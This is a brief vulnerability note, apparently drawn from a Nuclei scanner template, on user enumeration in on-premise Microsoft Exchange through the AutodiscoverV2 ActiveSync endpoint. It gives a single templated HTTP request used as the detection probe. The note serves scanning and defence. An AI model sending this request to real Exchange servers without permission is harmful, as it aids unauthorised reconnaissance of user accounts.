# Vulnerability: Microsoft Exchange Autodiscover - User Enumeration
**Classification:** MS-EXCHANGE
**Source:** Nuclei Template (`ms-exchange-user-enum.yaml`)

## Description
Microsoft Exchange (on premise) is prone to a user enumeration via the ActiveSync protocol using the AutodiscoverV2 endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/autodiscover/autodiscover.json?Protocol=ActiveSync&Email={{rand_text_alpha(6)}}%40oast.pro&RedirectCount=1
```

